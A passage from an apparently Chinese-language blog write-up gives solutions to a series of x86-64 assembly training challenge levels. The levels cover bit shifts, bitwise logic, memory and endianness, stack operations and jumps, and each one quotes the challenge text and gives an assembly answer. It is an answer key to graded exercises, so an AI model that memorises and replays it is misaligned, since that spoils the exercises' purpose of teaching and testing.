&#x27;reg2&#x27; can be replaced by a constant or memory location</span><br><span class="line"></span><br><span class="line">Using only the following instructions:</span><br><span class="line">  mov, shr, shl</span><br><span class="line"></span><br><span class="line">Please perform the following:</span><br><span class="line">  Set rax to the 5th least significant byte of rdi.</span><br><span class="line"></span><br><span class="line">For example:</span><br><span class="line">  rdi = | B7 | B6 | B5 | B4 | B3 | B2 | B1 | B0 |</span><br><span class="line">  Set rax to the value of B4</span><br><span class="line"></span><br><span class="line">We will now set the following in preparation for your code:</span><br><span class="line">  rdi = 0x5fd037c216a02397</span><br></pre></td></tr></table></figure>

<p>关卡要求将rax设置位rdi的第五个最低有效字节，使用位移动指令</p>
<p>直接将rdi第5个最低有效字节挪到最低8位，再使用mov即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.section .text</span><br><span class="line">.global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    shr rdi,32 ;</span><br><span class="line">    mov al, dil;</span><br></pre></td></tr></table></figure>



<h1 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">In this level you will be working with bit logic and operations. This will involve heavy use of</span><br><span class="line">directly interacting with bits stored in a register or memory location. You will also likely</span><br><span class="line">need to make use of the logic instructions in x86: and, or, not, xor.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Bitwise logic in assembly is yet another interesting concept!</span><br><span class="line">x86 allows you to perform logic operations bit by bit on registers.</span><br><span class="line"></span><br><span class="line">For the sake of this example say registers only store 8 bits.</span><br><span class="line"></span><br><span class="line">The values in rax and rbx are:</span><br><span class="line">  rax = 10101010</span><br><span class="line">  rbx = 00110011</span><br><span class="line"></span><br><span class="line">If we were to perform a bitwise AND of rax and rbx using the</span><br><span class="line">&quot;and rax, rbx&quot; instruction, the result would be calculated by</span><br><span class="line">ANDing each bit pair 1 by 1 hence why it&#x27;s called a bitwise</span><br><span class="line">logic.</span><br><span class="line"></span><br><span class="line">So from left to right:</span><br><span class="line">  1 AND 0 = 0</span><br><span class="line">  0 AND 0 = 0</span><br><span class="line">  1 AND 1 = 1</span><br><span class="line">  0 AND 1 = 0</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">Finally we combine the results together to get:</span><br><span class="line">  rax = 00100010</span><br><span class="line"></span><br><span class="line">Here are some truth tables for reference:</span><br><span class="line">      AND          OR           XOR</span><br><span class="line">   A | B | X    A | B | X    A | B | X</span><br><span class="line">  ---+---+---  ---+---+---  ---+---+---</span><br><span class="line">   0 | 0 | 0    0 | 0 | 0    0 | 0 | 0</span><br><span class="line">   0 | 1 | 0    0 | 1 | 1    0 | 1 | 1</span><br><span class="line">   1 | 0 | 0    1 | 0 | 1    1 | 0 | 1</span><br><span class="line">   1 | 1 | 1    1 | 1 | 1    1 | 1 | 0</span><br><span class="line"></span><br><span class="line">Without using the following instructions:</span><br><span class="line">  mov, xchg</span><br><span class="line"></span><br><span class="line">Please perform the following:</span><br><span class="line">  rax = rdi AND rsi</span><br><span class="line"></span><br><span class="line">i.e. Set rax to the value of (rdi AND rsi)</span><br><span class="line"></span><br><span class="line">We will now set the following in preparation for your code:</span><br><span class="line">  rdi = 0x6909f54276a98049</span><br><span class="line">  rsi = 0x8890371dbbabe438</span><br></pre></td></tr></table></figure>

<p>首先对rax清零，再将rdi and rsi的结果放在rdi中，最后进行或操作即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.section .text</span><br><span class="line">.global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    xor rax,rax</span><br><span class="line">    and rdi,rsi</span><br><span class="line">    or rax, rdi</span><br><span class="line"></span><br><span class="line">    </span><br></pre></td></tr></table></figure>



<h1 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">We will now set some values in memory dynamically before each run. On each run</span><br><span class="line">the values will change. This means you will need to do some type of formulaic</span><br><span class="line">operation with registers. We will tell you which registers are set beforehand</span><br><span class="line">and where you should put the result. In most cases, its rax.</span><br><span class="line"></span><br><span class="line">In this level you will be working with bit logic and operations. This will involve heavy use of</span><br><span class="line">directly interacting with bits stored in a register or memory location. You will also likely</span><br><span class="line">need to make use of the logic instructions in x86: and, or, not, xor.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Using only the following instructions:</span><br><span class="line">  and, or, xor</span><br><span class="line"></span><br><span class="line">Implement the following logic:</span><br><span class="line">  if x is even then</span><br><span class="line">    y = 1</span><br><span class="line">  else</span><br><span class="line">    y = 0</span><br><span class="line"></span><br><span class="line">where:</span><br><span class="line">  x = rdi</span><br><span class="line">  y = rax</span><br><span class="line"></span><br><span class="line">We will now set the following in preparation for your code:</span><br><span class="line">  rdi = 0x1358ee67</span><br></pre></td></tr></table></figure>

<p>关卡要求使用and、or、xor三个指令，进行逻辑判断，当x为偶数时，y&#x3D;1，反之y&#x3D;0，x为rdi，y为rax</p>
<p>先对rax清零，再将rdi的值给rax，最后对rax判断奇偶</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.section .text</span><br><span class="line">.global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    xor rax,rax</span><br><span class="line">    xor rax,rdi</span><br><span class="line">    and rax, 1</span><br><span class="line">    xor rax,1</span><br></pre></td></tr></table></figure>

<h1 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h1><p>没什么好说的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov rax,[0x404000]</span><br></pre></td></tr></table></figure>



<h1 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov rdi,0x404000</span><br><span class="line">mov [rdi],rax</span><br></pre></td></tr></table></figure>

<p>加个中转用的寄存器就行了</p>
<h1 id="level14"><a href="#level14" class="headerlink" title="level14"></a>level14</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">We will now set some values in memory dynamically before each run. On each run</span><br><span class="line">the values will change. This means you will need to do some type of formulaic</span><br><span class="line">operation with registers. We will tell you which registers are set beforehand</span><br><span class="line">and where you should put the result. In most cases, its rax.</span><br><span class="line"></span><br><span class="line">In this level you will be working with memory. This will require you to read or write</span><br><span class="line">to things stored linearly in memory. If you are confused, go look at the linear</span><br><span class="line">addressing module in &#x27;ike. You may also be asked to dereference things, possibly multiple</span><br><span class="line">times, to things we dynamically put in memory for your use.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Please perform the following:</span><br><span class="line">  Place the value stored at 0x404000 into rax</span><br><span class="line">  Increment the value stored at the address 0x404000 by 0x1337</span><br><span class="line"></span><br><span class="line">Make sure the value in rax is the original value stored at 0x404000 and make sure</span><br><span class="line">that [0x404000] now has the incremented value.</span><br><span class="line"></span><br><span class="line">We will now set the following in preparation for your code:</span><br><span class="line">  [0x404000] = 0x1dd994</span><br></pre></td></tr></table></figure>

<p>关卡要求将特定地址的值赋给寄存器，修改特定地址的值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.section .text</span><br><span class="line">.global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    mov rax, [0x404000]   ; </span><br><span class="line">    add rax, 0x1337       ; </span><br><span class="line">    mov [0x404000], rax   ;</span><br><span class="line">    sub rax, 0x1337       ;</span><br></pre></td></tr></table></figure>

<h1 id="level15"><a href="#level15" class="headerlink" title="level15"></a>level15</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Recall that registers in x86_64 are 64 bits wide, meaning they can store 64 bits.</span><br><span class="line"></span><br><span class="line">Similarly, each memory location can be treated as a 64 bit value.</span><br><span class="line"></span><br><span class="line">We refer to something that is 64 bits (8 bytes) as a quad word.</span><br><span class="line"></span><br><span class="line">Here is the breakdown of the names of memory sizes:</span><br><span class="line">  Quad Word   = 8 Bytes = 64 bits</span><br><span class="line">  Double Word = 4 bytes = 32 bits</span><br><span class="line">  Word        = 2 bytes = 16 bits</span><br><span class="line">  Byte        = 1 byte  = 8 bits</span><br><span class="line"></span><br><span class="line">In x86_64, you can access each of these sizes when dereferencing an address, just like using</span><br><span class="line">bigger or smaller register accesses:</span><br><span class="line">  mov al, [address]        &lt;=&gt;        moves the least significant byte from address to rax</span><br><span class="line">  mov ax, [address]        &lt;=&gt;        moves the least significant word from address to rax</span><br><span class="line">  mov eax, [address]       &lt;=&gt;        moves the least significant double word from address to rax</span><br><span class="line">  mov rax, [address]       &lt;=&gt;        moves the full quad word from address to rax</span><br><span class="line"></span><br><span class="line">Remember that moving into al does not fully clear the upper bytes.</span><br><span class="line"></span><br><span class="line">Please perform the following:</span><br><span class="line">  Set rax to the byte at 0x404000</span><br><span class="line"></span><br><span class="line">We will now set the following in preparation for your code:</span><br><span class="line">  [0x404000] = 0xff01c</span><br></pre></td></tr></table></figure>

<p>设置单字节数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov al,[0x404000]</span><br></pre></td></tr></table></figure>



<h1 id="level16"><a href="#level16" class="headerlink" title="level16"></a>level16</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">In this level you will be working with memory. This will require you to read or write</span><br><span class="line">to things stored linearly in memory. If you are confused, go look at the linear</span><br><span class="line">addressing module in &#x27;ike. You may also be asked to dereference things, possibly multiple</span><br><span class="line">times, to things we dynamically put in memory for your use.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Recall the following:</span><br><span class="line">  The breakdown of the names of memory sizes:</span><br><span class="line">    Quad Word   = 8 Bytes = 64 bits</span><br><span class="line">    Double Word = 4 bytes = 32 bits</span><br><span class="line">    Word        = 2 bytes = 16 bits</span><br><span class="line">    Byte        = 1 byte  = 8 bits</span><br><span class="line"></span><br><span class="line">In x86_64, you can access each of these sizes when dereferencing an address, just like using</span><br><span class="line">bigger or smaller register accesses:</span><br><span class="line">  mov al, [address]        &lt;=&gt;        moves the least significant byte from address to rax</span><br><span class="line">  mov ax, [address]        &lt;=&gt;        moves the least significant word from address to rax</span><br><span class="line">  mov eax, [address]       &lt;=&gt;        moves the least significant double word from address to rax</span><br><span class="line">  mov rax, [address]       &lt;=&gt;        moves the full quad word from address to rax</span><br><span class="line"></span><br><span class="line">Please perform the following:</span><br><span class="line">  Set rax to the byte at 0x404000</span><br><span class="line">  Set rbx to the word at 0x404000</span><br><span class="line">  Set rcx to the double word at 0x404000</span><br><span class="line">  Set rdx to the quad word at 0x404000</span><br><span class="line"></span><br><span class="line">We will now set the following in preparation for your code:</span><br><span class="line">  [0x404000] = 0x872b88618a05e240</span><br></pre></td></tr></table></figure>

<p>关卡要求将不同寄存器设置为特定地址的字节，字，双字，四字</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">四字 = 8 字节 = 64 位</span><br><span class="line">双字 = 4 字节 = 32 位</span><br><span class="line">字 = 2 字节 = 16 位</span><br><span class="line">字节 = 1 字节 = 8 位</span><br><span class="line">mov al，[地址] &lt;=&gt; 将最低有效字节从地址移动到 rax</span><br><span class="line">mov ax，[地址] &lt;=&gt; 将最低有效字从地址移动到 rax</span><br><span class="line">mov eax，[地址] &lt;=&gt; 将最低有效双字从地址移动到 rax</span><br><span class="line">mov rax，[地址] &lt;=&gt; 将完整的四字从地址移动到 rax</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.section .text</span><br><span class="line">.global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    mov al,[0x404000]</span><br><span class="line">    mov bx,[0x404000]</span><br><span class="line">    mov ecx,[0x404000]</span><br><span class="line">    mov rdx,[0x404000]</span><br></pre></td></tr></table></figure>



<h1 id="level17"><a href="#level17" class="headerlink" title="level17"></a>level17</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">In this level you will be working with memory. This will require you to read or write</span><br><span class="line">to things stored linearly in memory. If you are confused, go look at the linear</span><br><span class="line">addressing module in &#x27;ike. You may also be asked to dereference things, possibly multiple</span><br><span class="line">times, to things we dynamically put in memory for your use.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">It is worth noting, as you may have noticed, that values are stored in reverse order of how we</span><br><span class="line">represent them.</span><br><span class="line"></span><br><span class="line">As an example, say:</span><br><span class="line">  [0x1330] = 0x00000000deadc0de</span><br><span class="line"></span><br><span class="line">If you examined how it actually looked in memory, you would see:</span><br><span class="line">  [0x1330] = 0xde</span><br><span class="line">  [0x1331] = 0xc0</span><br><span class="line">  [0x1332] = 0xad</span><br><span class="line">  [0x1333] = 0xde</span><br><span class="line">  [0x1334] = 0x00</span><br><span class="line">  [0x1335] = 0x00</span><br><span class="line">  [0x1336] = 0x00</span><br><span class="line">  [0x1337] = 0x00</span><br><span class="line"></span><br><span class="line">This format of storing things in &#x27;reverse&#x27; is intentional in x86, and its called &quot;Little Endian&quot;.</span><br><span class="line"></span><br><span class="line">For this challenge we will give you two addresses created dynamically each run.</span><br><span class="line"></span><br><span class="line">The first address will be placed in rdi.</span><br><span class="line">The second will be placed in rsi.</span><br><span class="line"></span><br><span class="line">Using the earlier mentioned info, perform the following:</span><br><span class="line">  Set [rdi] = 0xdeadbeef00001337</span><br><span class="line">  Set [rsi] = 0xc0ffee0000</span><br><span class="line"></span><br><span class="line">Hint: it may require some tricks to assign a big constant to a dereferenced register.</span><br><span class="line">Try setting a register to the constant value then assigning that register to the dereferenced register.</span><br><span class="line"></span><br><span class="line">We will now set the following in preparation for your code:</span><br><span class="line">  [0x404330] = 0xffffffffffffffff</span><br><span class="line">  [0x4048d0] = 0xffffffffffffffff</span><br><span class="line">  rdi = 0x404330</span><br><span class="line">  rsi = 0x4048d0</span><br></pre></td></tr></table></figure>

<p>关卡有提到，值的存储顺序与我们表示它们的顺序相反，即小端序，关卡要求将两个存放在寄存器中的地址的值设置为特定大常数</p>
<p>使用未使用的寄存器rax来当作中间寄存器，0xc0ffee0000占40位，需要用[rsi+4]</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.section .text</span><br><span class="line">.global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    xor rax,rax</span><br><span class="line">    mov rax,0xdeadbeef00001337</span><br><span class="line">    mov [rdi],rax</span><br><span class="line">    xor rax,rax</span><br><span class="line">    mov [rsi],rax</span><br><span class="line">    mov rax,0xc0ffee0000</span><br><span class="line">    mov [rsi],eax</span><br><span class="line">    shr rax,32</span><br><span class="line">    mov byte ptr [rsi+4],al</span><br></pre></td></tr></table></figure>



<h1 id="level18"><a href="#level18" class="headerlink" title="level18"></a>level18</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">In this level you will be working with memory. This will require you to read or write</span><br><span class="line">to things stored linearly in memory. If you are confused, go look at the linear</span><br><span class="line">addressing module in &#x27;ike. You may also be asked to dereference things, possibly multiple</span><br><span class="line">times, to things we dynamically put in memory for your use.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Recall that memory is stored linearly.</span><br><span class="line"></span><br><span class="line">What does that mean?</span><br><span class="line"></span><br><span class="line">Say we access the quad word at 0x1337:</span><br><span class="line">  [0x1337] = 0x00000000deadbeef</span><br><span class="line"></span><br><span class="line">The real way memory is layed out is byte by byte, little endian:</span><br><span class="line">  [0x1337] = 0xef</span><br><span class="line">  [0x1337 + 1] = 0xbe</span><br><span class="line">  [0x1337 + 2] = 0xad</span><br><span class="line">  ...</span><br><span class="line">  [0x1337 + 7] = 0x00</span><br><span class="line"></span><br><span class="line">What does this do for us?</span><br><span class="line"></span><br><span class="line">Well, it means that we can access things next to each other using offsets,</span><br><span class="line">similar to what was shown above.</span><br><span class="line"></span><br><span class="line">Say you want the 5th *byte* from an address, you can access it like:</span><br><span class="line">  mov al, [address+4]</span><br><span class="line"></span><br><span class="line">Remember, offsets start at 0.</span><br><span class="line"></span><br><span class="line">Perform the following:</span><br><span class="line">  Load two consecutive quad words from the address stored in rdi</span><br><span class="line">  Calculate the sum of the previous steps quad words.</span><br><span class="line">  Store the sum at the address in rsi</span><br><span class="line"></span><br><span class="line">We will now set the following in preparation for your code:</span><br><span class="line">  [0x4041c8] = 0x65a6c</span><br><span class="line">  [0x4041d0] = 0xe45f3</span><br><span class="line">  rdi = 0x4041c8</span><br><span class="line">  rsi = 0x404790</span><br></pre></td></tr></table></figure>

<p>关卡要求计算从rdi开始加载两个连续的四字，计算其总和并存储在rsi的地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.section .text</span><br><span class="line">.global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    mov rax,[rdi]</span><br><span class="line">    mov rbx,[rdi+8]</span><br><span class="line">    add rax,rbx</span><br><span class="line">    mov [rsi],rax</span><br></pre></td></tr></table></figure>



<h1 id="level19"><a href="#level19" class="headerlink" title="level19"></a>level19</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">In this level you will be working with the stack, the memory region that dynamically expands</span><br><span class="line">and shrinks. You will be required to read and write to the stack, which may require you to use</span><br><span class="line">the pop and push instructions. You may also need to use the stack pointer register (rsp) to know</span><br><span class="line">where the stack is pointing.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">In these levels we are going to introduce the stack.</span><br><span class="line"></span><br><span class="line">The stack is a region of memory that can store values for later.</span><br><span class="line"></span><br><span class="line">To store a value on the stack we use the push instruction, and to retrieve a value we use pop.</span><br><span class="line"></span><br><span class="line">The stack is a last in first out (LIFO) memory structure, and this means</span><br><span class="line">the last value pushed in the first value popped.</span><br><span class="line"></span><br><span class="line">Imagine unloading plates from the dishwasher let&#x27;s say there are 1 red, 1 green, and 1 blue.</span><br><span class="line">First we place the red one in the cabinet, then the green on top of the red, then the blue.</span><br><span class="line"></span><br><span class="line">Our stack of plates would look like:</span><br><span class="line">  Top ----&gt; Blue</span><br><span class="line">            Green</span><br><span class="line">  Bottom -&gt; Red</span><br><span class="line"></span><br><span class="line">Now, if we wanted a plate to make a sandwich we would retrieve the top plate from the stack</span><br><span class="line">which would be the blue one that was last into the cabinet, ergo the first one out.</span><br><span class="line"></span><br><span class="line">On x86, the pop instruction will take the value from the top of the stack and put it into a register.</span><br><span class="line"></span><br><span class="line">Similarly, the push instruction will take the value in a register and push it onto the top of the stack.</span><br><span class="line"></span><br><span class="line">Using these instructions, take the top value of the stack, subtract rdi from it, then put it back.</span><br><span class="line"></span><br><span class="line">We will now set the following in preparation for your code:</span><br><span class="line">  rdi = 0xaef0</span><br><span class="line">  (stack) [0x7fffff1ffff8] = 0x23c9d32d</span><br></pre></td></tr></table></figure>

<p>对栈进行基本操作</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.section .text</span><br><span class="line">.global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    pop rax;</span><br><span class="line">    sub rax,rdi;</span><br><span class="line">    push rax;</span><br></pre></td></tr></table></figure>



<h1 id="level20"><a href="#level20" class="headerlink" title="level20"></a>level20</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">In this level you will be working with the stack, the memory region that dynamically expands</span><br><span class="line">and shrinks. You will be required to read and write to the stack, which may require you to use</span><br><span class="line">the pop and push instructions. You may also need to use the stack pointer register (rsp) to know</span><br><span class="line">where the stack is pointing.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">In this level we are going to explore the last in first out (LIFO) property of the stack.</span><br><span class="line"></span><br><span class="line">Using only following instructions:</span><br><span class="line">  push, pop</span><br><span class="line"></span><br><span class="line">Swap values in rdi and rsi.</span><br><span class="line">i.e.</span><br><span class="line">If to start rdi = 2 and rsi = 5</span><br><span class="line">Then to end rdi = 5 and rsi = 2</span><br><span class="line"></span><br><span class="line">We will now set the following in preparation for your code:</span><br><span class="line">  rdi = 0x2bdae14</span><br><span class="line">  rsi = 0x1820507e</span><br></pre></td></tr></table></figure>

<p>本关探索LIFO，仅使用po，push的情况下交换rdi和rsi的值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.section .text</span><br><span class="line">.global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    push rdi;</span><br><span class="line">    push rsi;</span><br><span class="line">    pop rdi;</span><br><span class="line">    pop rsi;</span><br></pre></td></tr></table></figure>



<h1 id="level21"><a href="#level21" class="headerlink" title="level21"></a>level21</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">In the previous levels you used push and pop to store and load data from the stack.</span><br><span class="line"></span><br><span class="line">However you can also access the stack directly using the stack pointer.</span><br><span class="line"></span><br><span class="line">On x86, the stack pointer is stored in the special register, rsp.</span><br><span class="line">rsp always stores the memory address of the top of the stack,</span><br><span class="line">i.e. the memory address of the last value pushed.</span><br><span class="line"></span><br><span class="line">Similar to the memory levels, we can use [rsp] to access the value at the memory address in rsp.</span><br><span class="line"></span><br><span class="line">Without using pop, please calculate the average of 4 consecutive quad words stored on the stack.</span><br><span class="line"></span><br><span class="line">Push the average on the stack.</span><br><span class="line"></span><br><span class="line">Hint:</span><br><span class="line">  RSP+0x?? Quad Word A</span><br><span class="line">  RSP+0x?? Quad Word B</span><br><span class="line">  RSP+0x?? Quad Word C</span><br><span class="line">  RSP      Quad Word D</span><br><span class="line"></span><br><span class="line">We will now set the following in preparation for your code:</span><br><span class="line">  (stack) [0x7fffff200000:0x7fffff1fffe0] = [&#x27;0x26044e9d&#x27;, &#x27;0x195ec9b6&#x27;, &#x27;0x11ac1d55&#x27;, &#x27;0x1eff98ab&#x27;] (list of things)</span><br></pre></td></tr></table></figure>

<p>关卡要求使用rsp来获取栈上数据，并计算其平均值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.section .text</span><br><span class="line">.global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">   mov rax, [rsp]       </span><br><span class="line">   mov rbx, [rsp+0x8]    </span><br><span class="line">   mov rcx, [rsp+0x10]   </span><br><span class="line">   mov rdx, [rsp+0x18]   </span><br><span class="line"></span><br><span class="line">   add rax, rbx          </span><br><span class="line">   add rax, rcx          </span><br><span class="line">   add rax, rdx          </span><br><span class="line"></span><br><span class="line">   shr rax, 2            </span><br><span class="line"></span><br><span class="line">   push rax              </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="level22"><a href="#level22" class="headerlink" title="level22"></a>level22</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">In this level, you will work with jumps.</span><br><span class="line"></span><br><span class="line">There are two types of jumps:</span><br><span class="line">  Unconditional jumps</span><br><span class="line">  Conditional jumps</span><br><span class="line"></span><br><span class="line">Unconditional jumps always trigger and are not based on the results of earlier instructions.</span><br><span class="line"></span><br><span class="line">As you know, memory locations can store data and instructions.</span><br><span class="line"></span><br><span class="line">Your code will be stored at 0x400039 (this will change each run).</span><br><span class="line"></span><br><span class="line">For all jumps, there are three types:</span><br><span class="line">  Relative jumps: jump + or - the next instruction.</span><br><span class="line">  Absolute jumps: jump to a specific address.</span><br><span class="line">  Indirect jumps: jump to the memory address specified in a register.</span><br><span class="line"></span><br><span class="line">In x86, absolute jumps (jump to a specific address) are accomplished by first putting the target address in a register reg, then doing jmp reg.</span><br><span class="line"></span><br><span class="line">In this level we will ask you to do an absolute jump.</span><br><span class="line"></span><br><span class="line">Perform the following:</span><br><span class="line">  Jump to the absolute address 0x403000</span><br><span class="line"></span><br><span class="line">We will now set the following in preparation for your code:</span><br><span class="line">  Loading your given code at: 0x400039</span><br></pre></td></tr></table></figure>

<p>关卡要求进行绝对跳转</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.section .text</span><br><span class="line">.global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">   mov rax,0x403000</span><br><span class="line">   jmp rax</span><br></pre></td></tr></table></figure>



<h1 id="level23"><a href="#level23" class="headerlink" title="level23"></a>level23</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">In this level we will ask you to do a relative jump.</span><br><span class="line"></span><br><span class="line">You will need to fill space in your code with something to make this relative jump possible.</span><br><span class="line"></span><br><span class="line">We suggest using the `nop` instruction. It&#x27;s 1 byte long and very predictable.</span><br><span class="line"></span><br><span class="line">In fact, the as assembler that we&#x27;re using has a handy .rept directive that you can use to</span><br><span class="line">repeat assembly instructions some number of times:</span><br><span class="line">  https://ftp.gnu.org/old-gnu/Manuals/gas-2.9.1/html_chapter/as_7.html</span><br><span class="line"></span><br><span class="line">Useful instructions for this level:</span><br><span class="line">  jmp (reg1 | addr | offset) ; nop</span><br><span class="line"></span><br><span class="line">Hint: for the relative jump, lookup how to use `labels` in x86.</span><br><span class="line"></span><br><span class="line">Using the above knowledge, perform the following:</span><br><span class="line">  Make the first instruction in your code a jmp</span><br><span class="line">  Make that jmp a relative jump to 0x51 bytes from the current position</span><br><span class="line">  At the code location where the relative jump will redirect control flow set rax to 0x1</span><br><span class="line"></span><br><span class="line">We will now set the following in preparation for your code:</span><br><span class="line">  Loading your given code at: 0x40009a</span><br></pre></td></tr></table></figure>



<p>关卡要求相对跳转，提示使用nop和.rept</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.section .text</span><br><span class="line">.global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">   jmp loop</span><br><span class="line">   .rept 0x51</span><br><span class="line">   nop</span><br><span class="line">   .endr</span><br><span class="line">   loop:</span><br><span class="line">   mov rax,0x1</span><br></pre></td></tr></table></figure>

<h1 id="level24"><a href="#level24" class="headerlink" title="level24"></a>level24</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">In this level you will be working with control flow manipulation. This involves using instructions</span><br><span class="line">to both indirectly and directly control the special register `rip`, the instruction pointer.</span><br><span class="line">You will use instructions such as: jmp, call, cmp, and their alternatives to implement the requested behavior.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Now, we will combine the two prior levels and perform the following:</span><br><span class="line">  Create a two jump trampoline:</span><br><span class="line">    Make the first instruction in your code a jmp</span><br><span class="line">    Make that jmp a relative jump to 0x51 bytes from its current position</span><br><span class="line">    At 0x51 write the following code:</span><br><span class="line">      Place the top value on the stack into register rdi</span><br><span class="line">      jmp to the absolute address 0x403000</span><br><span class="line"></span><br><span class="line">We will now set the following in preparation for your code:</span><br><span class="line">  Loading your given code at: 0x400076</span><br><span class="line">  (stack) [0x7fffff1ffff8] = 0x1e</span><br></pre></td></tr></table></figure>

<p>关卡要求使用控制流操作</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.section .text</span><br><span class="line">.global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">   jmp loop</span><br><span class="line">   .rept 0x51</span><br><span class="line">   nop</span><br><span class="line">   .endr</span><br><span class="line">   loop:</span><br><span class="line">   mov rdi,[rsp]</span><br><span class="line">   mov rsi,0x403000</span><br><span class="line">   jmp rsi</span><br></pre></td></tr></table></figure>

<h1 id="level25"><a href="#level25" class="headerlink" title="level25"></a>level25</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">In this level you will be working with control flow manipulation. This involves using instructions</span><br><span class="line">to both indirectly and directly control the special register `rip`, the instruction pointer.</span><br><span class="line">You will use instructions such as: jmp, call, cmp, and their alternatives to implement the requested behavior.</span><br><span class="line"></span><br><span class="line">We will be testing your code multiple times in this level with dynamic values! This means we will</span><br><span class="line">be running your code in a variety of random ways to verify that the logic is robust enough to</span><br><span class="line">survive normal use.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">We will now introduce you to conditional jumps--one of the most valuable instructions in x86.</span><br><span class="line">In higher level programming languages, an if-else structure exists to do things like:</span><br><span class="line">  if x is even:</span><br><span class="line">    is_even = 1</span><br><span class="line">  else:</span><br><span class="line">   is_even = 0</span><br><span class="line"></span><br><span class="line">This should look familiar, since it is implementable in only bit-logic, which you&#x27;ve done in a prior level.</span><br><span class="line"></span><br><span class="line">In these structures, we can control the program&#x27;s control flow based on dynamic values provided to the program.</span><br><span class="line"></span><br><span class="line">Implementing the above logic with jmps can be done like so:</span><br><span class="line"></span><br><span class="line">~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="line">; assume rdi = x, rax is output</span><br><span class="line">; rdx = rdi mod 2</span><br><span class="line">mov rax, rdi</span><br><span class="line">mov rsi, 2</span><br><span class="line">div rsi</span><br><span class="line">; remainder is 0 if even</span><br><span class="line">cmp rdx, 0</span><br><span class="line">; jump to not_even code is its not 0</span><br><span class="line">jne not_even</span><br><span class="line">; fall through to even code</span><br><span class="line">mov rbx, 1</span><br><span class="line">jmp done</span><br><span class="line">; jump to this only when not_even</span><br><span class="line">not_even:</span><br><span class="line">mov rbx, 0</span><br><span class="line">done:</span><br><span class="line">mov rax, rbx</span><br><span class="line">; more instructions here</span><br><span 